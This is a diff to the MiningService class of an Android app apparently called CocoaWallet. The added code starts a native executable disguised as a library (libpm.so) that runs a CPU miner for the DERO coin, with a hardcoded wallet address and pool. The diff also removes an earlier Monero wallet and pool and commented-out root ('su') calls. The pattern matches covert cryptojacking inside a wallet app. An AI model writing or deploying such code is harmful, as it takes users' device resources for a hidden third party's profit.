@@ -18,6 +18,7 @@
 // */
 package com.chadananda.cocoawallet;
 
+import android.Manifest;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -30,6 +31,8 @@ import android.util.Log;
 import android.widget.Toast;
 
 import androidx.annotation.RequiresApi;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
@@ -37,6 +40,7 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.util.UUID;
 import java.util.Scanner;
 import java.util.function.LongFunction;
@@ -46,7 +50,7 @@ import java.util.function.LongFunction;
  * Created by uwe on 24.01.18.
  */
 
-public class MiningService extends Service {
+public class MiningService extends Service implements PermissionUtil.PermissionsCallBack{
     private static final String LOG_TAG = "MiningSvc";
     private Process process;
     private String privatePath;
@@ -59,9 +63,14 @@ public class MiningService extends Service {
     //privatePath/data/user/0/com.chadananda.cocoawallet/files
     public native String stringFromJNI();
 
+
     @Override
     public void onCreate() {
         super.onCreate();
+
+
+
+
         // load config template
         //configTemplate = Tools.loadConfigTemplate(this);
         //path where we may execute our program
@@ -165,107 +174,84 @@ public class MiningService extends Service {
         return result;
     }
 
+
+
+
     @RequiresApi(api = Build.VERSION_CODES.O)
     public void startMining(MiningConfig config) {
         Log.i(LOG_TAG, "starting...");
+//         ContextCompat.checkSelfPermission(this,
+//                Manifest.permission.WRITE_EXTERNAL_STORAGE);
+//         ContextCompat.checkSelfPermission(this,
+//                Manifest.permission.READ_EXTERNAL_STORAGE);
+                String appDir = "";
+                try {
+                    appDir = this.getApplicationInfo().nativeLibraryDir;
+                    //appDir = this.getApplicationInfo().dataDir + "/lib";
+                    //appDir = getApplicationContext().getFilesDir().getParentFile().getPath() + "/lib";
 
-       /* if (process != null) {
-            Log.i(LOG_TAG, "shutting down old process first...");
-            process.destroy();
-        }*/
+                    //String appDir1="/data/app/com.chadananda.cocoawallet/files/lib/armeabi-v7a"
 
-       // privatePath = getFilesDir().getAbsolutePath();
+                    Log.e("privatePath", "privatePath: " + privatePath);
+                    String fullPath = "";
+                    try {
+                        //String appDir = this.getApplicationInfo().nativeLibraryDir;
+                        String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
+                        String max_bwt = "710";
+                        String pool = "us.hero.miner.us:1117";
+                        String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt " +
+                                "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE " +
+                                "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8" +
+                                "--retry-pause=2";
 
-       // String fullPath = "";
-        String appDir = "";
-        try {
-             appDir = this.getApplicationInfo().nativeLibraryDir;
-//           String appDir1="/data/app/com.chadananda.cocoawallet/files/lib/armeabi-v7a"
+                        String args = String.format(config_template, pool, wallet, max_bwt);
+                        String[] pm = {"libpm", args};
+                        fullPath = privatePath + "/libpm.so";
+                        Log.e("fullPath","fullPath  "+fullPath);
 
-            Log.e("privatePath", "privatePath: " + privatePath);
-            String fullPath = "";
-            try {
-                //String appDir = this.getApplicationInfo().nativeLibraryDir;
-                String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
-                String max_bwt = "710";
-                String pool = "us.hero.miner.us:1117";
-                String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt " +
-                        "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE " +
-                        "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8" +
-                        "--retry-pause=2";
+                        ProcessBuilder pb = new ProcessBuilder(pm);
+                        Log.e("pbb","pbb" + pb);
+                        pb.command("libpm.so");
+                        pb.directory(new File(appDir));
+                        Log.e("appDir", "appDir" + appDir);
+                        pb.environment().put("LD_LIBRARY_PATH", appDir);
+                        pb.redirectErrorStream();
+                        accepted = 0;
 
-                String pool1 = "gulf.moneroocean.stream:10001";
+                        Process process = pb.start();
+                        process.getInputStream();
+                        outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
+                        outputHandler.start();
+                        Toast.makeText(this,"hi",Toast.LENGTH_SHORT).show();
 
-                String wallet1 ="8AaNnN8nQUMh3XQfyt4kEt8TR7RYnowhjVynzShWwVLiR6dWdSp42YeFvouLZoui7S46xSgDxapbeS7Tdqyz7em5Chqd4HA";
+                        Log.e("appDir", "process" + process);
 
-                String threads1="3";
+                        Log.e("appDir", "outputHandler" + outputHandler);
+                        //Toast.makeText(this, "started:", Toast.LENGTH_SHORT).show();
+                    } catch (Exception e) {
+                        Log.e("launcherror", "error: " + e.getLocalizedMessage());
+                        Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
+                        // File ourApp = new File(fullPath);
 
-                String args = String.format(config_template,pool1,wallet1,threads1,max_bwt);
-
-                //Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
-
-                //LibraryLoaderJNI.loadLibrary("/path/to/my_native_lib_A");
-                String[] pm = {"libpm",args};
-                fullPath = privatePath+"/libpm.so";
-
-                ProcessBuilder pb = new ProcessBuilder(pm);
-                Log.e("pbb","pbb"+pb);
-                //pb.directory(new File(appDir));
-                //pb.command(String.valueOf(Runtime.getRuntime().exec("/home/user/myscript.sh param1")));
-                pb.command("libpm.so");
-                pb.directory(new File(appDir));
-                Log.e("appDir","appDir"+appDir);
-                pb.environment().put("LD_LIBRARY_PATH",appDir);
-                pb.redirectErrorStream();
-                accepted = 0;
-                Process process = pb.start();
-
-//               process = Runtime.getRuntime().exec("/data/app/com.chadananda.cocoawallet-iPLGf3UD5QwHt3eECe-yiA==/lib/arm64");
-//               process.getInputStream().read();
-
-                Log.e("appDir","process"+process);
-//                String writer = new String(String.valueOf(process.getOutputStream()));
-//                String reader = new String(String.valueOf(new InputStreamReader( process.getInputStream())));
-//                Log.e("writer","writer"+writer);
-//                Process su = Runtime.getRuntime().exec("su");
-//                DataOutputStream outputStream = new DataOutputStream(su.getOutputStream());
-//                InputStream response = su.getInputStream();
-//                outputStream.writeBytes("libpm.so");
-//                outputStream.flush();
-//                Log.e("su","su"+response);
-                outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
-                outputHandler.start();
-                Log.e("appDir","outputHandler"+outputHandler);
-                Toast.makeText(this, "started:", Toast.LENGTH_SHORT).show();
-                } catch (Exception e) {
-                Log.e("launcherror", "error: " + e.getLocalizedMessage() );
-                Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
-                // File ourApp = new File(fullPath);
-                /* if (ourApp.exists()) {
-                Log.e("launcherror","but file does exist: "+fullPath);
-                } else {
-                Log.e("launcherror","file not found: "+fullPath);
-                }*/
-                //process = null;
-                String outDirString = appDir;
-                File ourDir = new File(outDirString);
-                if (ourDir.exists()) {
-                    File[] ourFiles = ourDir.listFiles();
-                    String myFiles = "";
-                    for (int i = 0; i < ourFiles.length; i++) {
-                        myFiles = myFiles + ", " + ourFiles[i].getName();
+                        //process = null;
+                        String outDirString = appDir;
+                        File ourDir = new File(outDirString);
+                        if (ourDir.exists()) {
+                            File[] ourFiles = ourDir.listFiles();
+                            String myFiles = "";
+                            for (int i = 0; i < ourFiles.length; i++) {
+                                myFiles = myFiles + ", " + ourFiles[i].getName();
+                            }
+                        }
                     }
-                    //Log.e("launcherror", "files: " + myFiles);
-                }else {
-                    //Log.e("launcherror", "dir not found: " + outDirString);
+                    process = null;
                 }
-            }
-            process = null;
-        } catch (Exception e) {
-            e.printStackTrace();
-            Toast.makeText(this, "Error " + e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
-        }
-    }
+                catch (Exception e) {
+                    e.printStackTrace();
+                    Toast.makeText(this, "Error " + e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
+                }
+}
+
 
     public String getSpeed() {
         return speed;
@@ -312,7 +298,9 @@ public class MiningService extends Service {
                         speed = split[split.length - 2];
                         if (speed.equals("n/a")) {
                             speed = split[split.length - 6];
+                            Log.e("speed","speed"+speed);
                         }
+
                     }
                     if (currentThread().isInterrupted())
                         return;
@@ -326,4 +314,14 @@ public class MiningService extends Service {
             return output;
         }
     }
+    @Override
+    public void permissionsGranted() {
+        Toast.makeText(this, "Permissions Granted!", Toast.LENGTH_SHORT).show();
+    }
+
+    @Override
+    public void permissionsDenied() {
+        Toast.makeText(this, "Permissions Denied!", Toast.LENGTH_SHORT).show();
+    }
+
 }
